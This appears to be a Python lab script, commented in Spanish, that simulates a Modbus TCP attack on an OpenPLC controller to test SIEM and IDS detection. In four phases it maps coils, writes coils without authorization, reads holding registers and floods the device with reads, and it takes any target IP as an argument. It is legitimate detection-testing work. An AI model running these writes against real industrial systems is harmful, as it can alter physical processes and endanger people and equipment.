#!/usr/bin/env python3
"""
Simulación de ataque Modbus TCP contra OpenPLC
Técnicas: Reconnaissance, Write Coils Unauthorized, Register Manipulation
Objetivo: Verificar detección SIEM y alertas IDS/IPS
"""
from pymodbus.client import ModbusTcpClient
import time
import sys

def simulate_modbus_attack(target='192.168.50.10', port=502):
    print(f"[+] Iniciando simulación de ataque Modbus TCP")
    print(f"[+] Target: {target}:{port}")

    try:
        client = ModbusTcpClient(target, port=port, timeout=5)
    except Exception as e:
        print(f"[!] Error inicializando cliente: {e}")
        return False

    if not client.connect():
        print("[!] Error: No se pudo conectar al PLC")
        print("[*] Nota: Asegúrate de que el entorno OT está activo")
        print("[*] Ejecuta: docker-compose -f docker-compose.ot.yml up -d")
        return False

    print("[✓] Conexión establecida")

    print("\n[*] Fase 1: Reconnaissance - Leyendo todas las coils")
    try:
        result = client.read_coils(0, 100)
        if hasattr(result, 'bits'):
            print(f"    [✓] Coils leídas: {len(result.bits)}")
        else:
            print(f"    [!] Respuesta inesperada: {result}")
    except Exception as e:
        print(f"    [!] Error: {e}")

    time.sleep(1)

    print("\n[*] Fase 2: Write Attack - Modificando coils sin autorización")
    try:
        client.write_coil(0, True)
        time.sleep(0.5)
        client.write_coil(1, False)
        time.sleep(0.5)
        client.write_coil(2, True)
        print(f"    [✓] Coils modificadas (0, 1, 2)")
    except Exception as e:
        print(f"    [!] Error: {e}")

    time.sleep(1)

    print("\n[*] Fase 3: Register Manipulation - Leyendo holding registers")
    try:
        result = client.read_holding_registers(0, 50)
        if hasattr(result, 'registers'):
            print(f"    [✓] Registers leídos: {len(result.registers)}")
        else:
            print(f"    [!] Respuesta inesperada: {result}")
    except Exception as e:
        print(f"    [!] Error: {e}")

    time.sleep(1)

    print("\n[*] Fase 4: Rapid Fire - Flood de lecturas")
    try:
        for i in range(20):
            client.read_coils(0, 10)
            time.sleep(0.1)
        print(f"    [✓] 20 lecturas rápidas ejecutadas")
    except Exception as e:
        print(f"    [!] Error: {e}")

    client.close()
    print("\n[✓] Simulación completa")
    print("[!] Verificar alertas en Kibana: http://localhost:5601")
    print("[!] Buscar: alert.id:(SCAN-001 OR RATE-001)")
    return True

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.50.10"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    success = simulate_modbus_attack(target, port)
    sys.exit(0 if success else 1)
